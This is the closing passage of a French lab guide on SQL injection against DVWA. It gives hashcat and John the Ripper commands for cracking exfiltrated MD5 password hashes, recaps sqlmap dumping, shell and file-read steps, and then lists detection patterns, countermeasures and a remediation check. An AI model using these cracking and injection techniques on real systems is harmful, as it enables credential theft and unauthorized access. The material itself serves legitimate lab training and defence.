  - `-a 0` : mode attaque droite (dictionnaire) — chaque mot de la wordlist est hashé en MD5 et comparé au hash cible.
  - `hash-md5.txt` : fichier contenant le ou les hashs à craquer.
  - `/usr/share/wordlists/rockyou.txt` : wordlist de mots de passe candidats.
  - `--potfile-path ~/sqli-lab/hashcat.potfile` : enregistre les hashs déjà craqués pour éviter de les recraquer.
  - `--show` : affiche les résultats craqués sous la forme `hash:mot_de_passe`.
- `else` : si hashcat ou la wordlist est absent, affiche le message et marque l'étape « non testée en réel — outil/wordlist indisponible » sans exécuter de craquage.
- `John the Ripper (alternative)` : si hashcat est indisponible, `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash-md5.txt` puis `john --show hash-md5.txt` ; même périmètre LAB-ONLY, même réserve de disponibilité de l'outil et de la wordlist.
- Piège : le craquage de hashs n'est autorisé que sur les données de ce lab, dans l'isolat `192.168.56.0/24` ; tout craquage en dehors est interdit.
- Piège : sans wordlist contenant le mot de passe, l'attaque échoue (le mot doit figurer dans le dictionnaire) ; ne jamais inventer de résultat.
- Piège : si hashcat ou la wordlist est indisponible, l'étape est déclarée « non testée en réel — outil/wordlist indisponible » et aucun résultat n'est inventé.

**Résultat attendu** (non testé en réel — outil hashcat indisponible)

Cas A — hashcat et wordlist disponibles, hash craqué :

```text
Hashes: 1 hashes, 1 unique salts...
...
5f4dcc3b5aa765d61d8327deb882cf99:password
...
Status...: Cracked
```

Cas B — hashcat ou wordlist indisponible :

```text
hashcat ou wordlist indisponible — étape non testée en réel — outil/wordlist indisponible
```

> **Non testée en réel — outil indisponible.** `hashcat` n'est pas installé sur la machine d'exécution et aucune sortie Internet n'est disponible pour l'installer. Aucun résultat de craquage n'a été inventé.

### En conclusion

**Synthèse.** Ce lab a démontré, sur DVWA en niveau `low`, le cycle complet d'une injection SQL : détection du paramètre `id` (fuzzing puis sqlmap), énumération des bases, tables et colonnes, exfiltration des comptes de la table `users` avec leurs hashs, illustration manuelle du mécanisme `UNION SELECT`, modification de données (INSERT/DELETE via `--sql-shell`) et tentative de lecture de fichier (`--file-read`). Toutes les actions ont été réalisées dans le laboratoire isolé `192.168.56.0/24`, sur des données factices (`LAB-ONLY`), avec snapshot réversible.

**Critères de réussite.**
- [ ] DVWA joignable (`HTTP 200`).
- [ ] Session ouverte et niveau `low` activé.
- [ ] Paramètre `id` identifié injectable (erreur MySQL ou sqlmap).
- [ ] Bases de données listées (`--dbs`).
- [ ] Tables et colonnes de `dvwa` énumérées (`--tables`, `--columns`).
- [ ] Table `users` extraite sans craquage de hash (`--dump`, `--answers=crack=N`).
- [ ] Hashs MD5 exfiltrés craqués avec hashcat (Étape 11) ou limitation consignée (outil/wordlist indisponible).
- [ ] Requête `UNION SELECT` manuelle illustrant le mécanisme.
- [ ] Ligne de test insérée puis supprimée via `--sql-shell`.
- [ ] Lecture de fichier tentée (`--file-read`), succès ou limitation consignée.

**Détection (ATT&CK `T1190`).**
- Journaux web Apache (`access.log`) : requêtes sur `/dvwa/vulnerabilities/sqli/` dont le paramètre `id` contient des caractères SQL (`'`, `"`, `;`, `UNION`, `--`, `#`), codes HTTP 500 répétés, ou réponses anormalement longues (blind time-based).
- Journaux MySQL (error log, general log si activé) : erreurs de syntaxe SQL.
- WAF : alertes sur les signatures d'injection SQL.
- Règle d'alerte exemple : plus de 5 requêtes contenant `UNION`, `SELECT`, `SLEEP` ou `LOAD_FILE` depuis une même adresse IP sur 5 minutes génèrent une alerte.
- IOCs : présence de mots-clés SQL dans les URI (`union`, `select`, `sleep`, `load_file`, `into outfile`), messages d'erreur MySQL retournés au client, requêtes avec un nombre anormal de paramètres encodés (`%27`, `%23`, `%2d%2d`).

**Contre-mesures.**
- Requêtes préparées / requêtes paramétrées (ex. PDO avec placeholders) : jamais de concaténation de données utilisateur dans la requête SQL.
- Validation d'entrée : typage strict (ex. `id` doit être un entier), liste blanche des valeurs autorisées.
- Principe du moindre privilège : le compte MySQL de l'application n'a que les droits strictement nécessaires sur les tables requises, sans privilège `FILE`, `DROP` ni accès aux bases système.
- Suppression des erreurs détaillées vers le client : `display_errors = Off`, erreurs journalisées côté serveur uniquement.
- WAF en détection puis en blocage, maintenu à jour.
- Maintien à jour de DVWA/MySQL et suppression des comptes de test.

**Méthode de vérification de la remédiation.** Après application des contre-mesures (requêtes préparées, moindre privilège, erreurs masquées), relancer sqlmap avec les mêmes options (Étape 4) : l'outil doit conclure que le paramètre n'est pas injectable (`not injectable`). Toute détection résiduelle signifie que la remédiation est incomplète.

**Renvoi.** Ce lab se prolonge par la suite de l'exploitation web du Chapitre 1 (Lab-08 : XSS réfléchi et XSS stocké sur DVWA). Vous passez ensuite au module de contre-mesures et de hardening, avec validation par re-scan sqlmap négatif.